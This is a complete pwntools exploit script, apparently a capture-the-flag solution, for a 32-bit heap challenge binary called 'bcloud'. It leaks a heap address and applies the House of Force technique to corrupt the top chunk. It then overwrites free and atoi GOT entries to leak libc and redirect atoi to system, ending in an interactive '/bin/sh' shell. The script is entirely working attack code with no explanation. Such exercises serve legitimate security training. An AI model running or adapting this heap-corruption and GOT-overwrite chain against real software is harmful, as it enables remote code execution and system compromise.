from pwn import *

io = remote('0.0.0.0', 10001)		# io = process('./bcloud')
elf = ELF('bcloud')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')

def new(length, content):
	io.sendlineafter("option--->>\n", '1')
	io.sendlineafter("content:\n", str(length))
	io.sendlineafter("content:\n", content)

def edit(idx, content):
	io.sendlineafter("option--->>\n", '3')
	io.sendline(str(idx))
	io.sendline(content)

def delete(idx):
	io.sendlineafter("option--->>\n", '4')
	io.sendlineafter("id:\n", str(idx))

def leak_heap():
	global leak

	io.sendafter("name:\n", "A" * 0x40)
	leak = u32(io.recvuntil('! Welcome', drop=True)[-4:])
	log.info("leak heap address: 0x%x" % leak)

def house_of_force():
	io.sendafter("Org:\n", "A" * 0x40)
	io.sendlineafter("Host:\n", p32(0xffffffff))		# overwrite top chunk size

	new(0x0804b0a0 - (leak + 0xd0) - 8*2, 'AAAA')		# 0xd0 = top chunk - leak

	payload  = "A" * 0x80
	payload += p32(elf.got['free'])			# notes[0]
	payload += p32(elf.got['atoi']) * 2		# notes[1], notes[2]
	new(0x8c, payload)

def leak_libc():
	global system_addr

	edit(0, p32(elf.plt['puts']))				# *free@got.plt = puts@plt

	delete(1)								# puts(atoi_addr)
	io.recvuntil("id:\n")
	atoi_addr = u32(io.recvn(4))
	libc_base = atoi_addr - libc.symbols['atoi']
	system_addr = libc_base + libc.symbols['system']

	log.info("leak atoi address: 0x%x" % atoi_addr)
	log.info("libc base: 0x%x" % libc_base)
	log.info("system address: 0x%x" % system_addr)

def pwn():
	edit(2, p32(system_addr))					# *atoi@got.plt = system_addr
	io.sendline("/bin/sh\x00")

	io.recvuntil("option--->>\n")
	io.interactive()

leak_heap()
house_of_force()
leak_libc()
pwn()
